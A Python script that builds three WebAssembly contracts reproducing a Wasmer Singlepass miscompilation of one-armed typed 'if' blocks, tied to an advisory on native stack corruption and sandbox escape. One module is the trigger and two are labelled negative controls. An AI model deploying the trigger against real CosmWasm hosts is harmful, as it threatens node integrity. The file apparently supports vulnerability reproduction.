#!/usr/bin/env python3
"""
Hand-assembles minimal CosmWasm-compatible contracts that exercise the
Wasmer Singlepass lowering for a *typed `if` with block parameters*.

Variant A (implicit_else): the `if` has NO `else` block -> the false arm
           implicitly passes the block parameters through. This is the exact
           construct named in GHSA-v2h8-j899-r676 ("implicit-else
           miscompilation allows native stack corruption and sandbox escape").

Variant B (explicit_else): identical module, but with an explicit (empty)
           `else` arm -> exercises the correctly-lowered path. NEGATIVE CONTROL.

Variant C (implicit_else_true): identical to A, but the condition is always
           TRUE, so the false arm is never taken. NEGATIVE CONTROL.

Contract surface (passes cosmwasm-vm v3.0.10 static validation):
  exports: memory, interface_version_8 (func), allocate, deallocate,
           instantiate, execute
  imports: none
"""

import struct


def uleb(n: int) -> bytes:
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def sleb(n: int) -> bytes:
    out = bytearray()
    more = True
    while more:
        b = n & 0x7F
        n >>= 7
        if (n == 0 and not (b & 0x40)) or (n == -1 and (b & 0x40)):
            more = False
        else:
            b |= 0x80
        out.append(b)
    return bytes(out)


def section(sid: int, payload: bytes) -> bytes:
    return bytes([sid]) + uleb(len(payload)) + payload


def vec(items) -> bytes:
    return uleb(len(items)) + b"".join(bytes([i]) if isinstance(i, int) else i for i in items)


I32 = 0x7F

# ---------------------------------------------------------------- type section
# t0: (i32,i32,i32) -> (i32)    entry points (env, info, msg)
# t1: (i32) -> (i32)            allocate; ALSO the loop blocktype (1 param, 1 result)
# t2: (i32) -> (i32)            THE typed-if blocktype (1 block param, one-armed;
#                               params == results so the implicit else is valid).
#                               cosmwasm rejects any type with >1 result, and
#                               counts ALL type-section entries, so 1x1 it is.
#                               Spilling of the block parameter is forced by the
#                               10 outer live values in the loop body.
# t3: (i32) -> ()               deallocate
# t4: () -> ()                  interface_version_8 marker func
types = [
    b"\x60" + vec([I32] * 3) + vec([I32]),   # t0
    b"\x60" + vec([I32]) + vec([I32]),       # t1
    b"\x60" + vec([I32]) + vec([I32]),       # t2
    b"\x60" + vec([I32]) + vec([]),          # t3
    b"\x60" + vec([]) + vec([]),             # t4
]
TYPE = section(1, vec(types))

# ---------------------------------------------------------------- func section
funcs = [uleb(1), uleb(3), uleb(0), uleb(0), uleb(4)]
FUNC = section(3, vec(funcs))

# ------------------------------------------------------------- memory section
MEM = section(5, vec([b"\x00" + uleb(1)]))  # 1 page (64 KiB)

# ------------------------------------------------------------- global section
# g0: mutable i32 heap bump pointer = 1024
globals_ = [b"\x7f\x01" + b"\x41" + sleb(1024) + b"\x0b"]
GLOBAL = section(6, vec(globals_))

def uleb_name(name: str) -> bytes:
    nb = name.encode()
    return uleb(len(nb)) + nb


# ------------------------------------------------------------ export section
exports = [
    uleb_name("memory") + b"\x02" + uleb(0),
    uleb_name("interface_version_8") + b"\x00" + uleb(4),
    uleb_name("allocate") + b"\x00" + uleb(0),
    uleb_name("deallocate") + b"\x00" + uleb(1),
    uleb_name("instantiate") + b"\x00" + uleb(2),
    uleb_name("execute") + b"\x00" + uleb(3),
]

EXPORT = section(7, vec(exports))

# ------------------------------------------------------------ code section
# f0: allocate (i32)->(i32) bump allocator
f0 = (
    sleb(1024 + 4096)  # placeholder replaced below
)


def body(code: bytes, locals_: list = None) -> bytes:
    if locals_:
        loc = uleb(len(locals_)) + b"".join(uleb(c) + bytes([t]) for c, t in locals_)
    else:
        loc = uleb(0)  # zero local declarations
    b = loc + code + b"\x0b"
    return uleb(len(b)) + b


f0_code = (
    # Region header: [ptr] = ptr+12 (offset), [ptr+4] = len (capacity), [ptr+8] = 0 (length)
    b"\x23\x00"                       # global.get heap          [H]
    + b"\x22\x01"                     # local.tee ptr            [H]  (local 1 = ptr)
    + b"\x20\x01"                     # local.get ptr            [H, P]
    + b"\x20\x01"                     # local.get ptr            [H, P, P]
    + b"\x41\x0c"                     # i32.const 12             [H, P, P, 12]
    + b"\x6a"                          # i32.add                  [H, P, P+12]
    + b"\x36\x02\x00"                # i32.store                [H]      [P] = P+12
    + b"\x20\x01"                     # local.get ptr            [H, P]
    + b"\x41\x04"                     # i32.const 4              [H, P, 4]
    + b"\x6a"                          # i32.add                  [H, P+4]
    + b"\x20\x00"                     # local.get len            [H, P+4, len]
    + b"\x36\x02\x00"                # i32.store                [H]      [P+4] = len
    + b"\x20\x01"                     # local.get ptr            [H, P]
    + b"\x41\x08"                     # i32.const 8              [H, P, 8]
    + b"\x6a"                          # i32.add                  [H, P+8]
    + b"\x41\x00"                     # i32.const 0              [H, P+8, 0]
    + b"\x36\x02\x00"                # i32.store                [H]      [P+8] = 0
    # bump heap by round4(len + 12)
    + b"\x23\x00"                     # global.get heap          [H, H]
    + b"\x20\x00"                     # local.get len            [H, H, len]
    + b"\x41\x0c"                     # i32.const 12             [H, H, len, 12]
    + b"\x6a"                          # i32.add                  [H, H, len+12]
    + b"\x41\x03"                     # i32.const 3              [H, H, len+12, 3]
    + b"\x6a"                          # i32.add                  [H, H, len+15]
    + b"\x41\x7c"                     # i32.const -4             [H, H, len+15, -4]
    + b"\x71"                          # i32.and                  [H, H, aligned]
    + b"\x6a"                          # i32.add                  [H, H+aligned]
    + b"\x24\x00"                     # global.set heap          [H]
)
f1_code = b""                       # deallocate: empty
f2_code = b"\x41" + sleb(2048)          # instantiate -> empty region @2048 (zeroed memory)                # instantiate -> empty region @2048 (zeroed memory)

ITERS = 2_000_000


def execute_body(explicit_else: bool, true_condition: bool) -> bytes:
    """Loop executing a one-armed typed `if` (1 block param, no else).

    10 outer live values force singlepass to spill the block parameter to the
    native stack. Taking the false arm is the GHSA-v2h8 trigger.
    """
    c = bytearray()
    c += b"\x41" + sleb(ITERS) + b"\x21\x00"   # i = 2_000_000
    c += b"\x41\x00"                            # initial loop carry 0
    c += b"\x03\x01"                            # loop, blocktype = type 1 ((i32)->(i32))
    c += b"\x1a"                                 #   drop carry
    # 10 outer live values (stay live across the if -> force spilling)
    for k in range(10):
        c += b"\x41" + sleb(100 + k)
    # --- the typed one-armed `if` -------------------------------------------
    c += b"\x41\x07"                            #   if param: const 7
    if true_condition:
        c += b"\x41\x01"                        #   condition = 1 (TRUE) -> then arm
    else:
        c += b"\x20\x00\x45"                   #   local.get i; i32.eqz -> FALSE while i>0
    c += b"\x04\x02"                            #   if, blocktype = type 2 ((i32)->(i32))
    c += b"\x1a"                                 #     drop param (then arm consumes it)
    c += b"\x41\x37"                            #     i32.const 55 (result)
    if explicit_else:
        c += b"\x05"                             #   else (empty -> param passes through)
    c += b"\x0b"                                 #   end if
    # --------------------------------------------------------------------------
    c += b"\x1a"                                 #   drop if_result
    for _ in range(9):
        c += b"\x1a"                             #   drop 9 outer values (keep 1)
    # --------------------------------------------------------------------------
    c += b"\x20\x00\x41\x01\x6b\x22\x00"   #   i = i - 1 (local.tee)
    c += b"\x0d\x00"                            #   br_if 0 (loop back-edge; result = carry)
    c += b"\x0b"                                 # end loop -> [carry]
    c += b"\x1a"                                 # drop carry
    c += b"\x41" + sleb(2048)                    # return valid empty region @2048
    return bytes(c)


# ------------------------------------------------------------ data section
# Region header at 2048: offset=2128, capacity=64, length=0 (empty result region)
region_header = (struct.pack("<I", 2128) + struct.pack("<I", 64) + struct.pack("<I", 0)
                 + b"\x00" * 20)  # pad 5 x u32
DATA = section(11, vec([b"\x00" + b"\x41" + sleb(2048) + b"\x0b" + uleb(len(region_header)) + region_header]))


def build(explicit_else: bool, true_condition: bool) -> bytes:
    bodies = [
        body(f0_code, locals_=[(1, I32)]),
        body(f1_code),
        body(f2_code),
        body(execute_body(explicit_else, true_condition), locals_=[(1, I32)]),
        body(b""),                     # interface_version_8 marker
    ]
    CODE = section(10, vec(bodies))
    return (
        b"\x00asm" + b"\x01\x00\x00\x00"
        + TYPE + FUNC + MEM + GLOBAL + EXPORT + CODE + DATA
    )


if __name__ == "__main__":
    import sys, os
    outdir = sys.argv[1] if len(sys.argv) > 1 else "."
    os.makedirs(outdir, exist_ok=True)
    open(os.path.join(outdir, "implicit_else.wasm"), "wb").write(build(False, False))
    open(os.path.join(outdir, "explicit_else.wasm"), "wb").write(build(True, False))
    open(os.path.join(outdir, "implicit_else_true.wasm"), "wb").write(build(False, True))
    print("wrote 3 modules to", outdir)
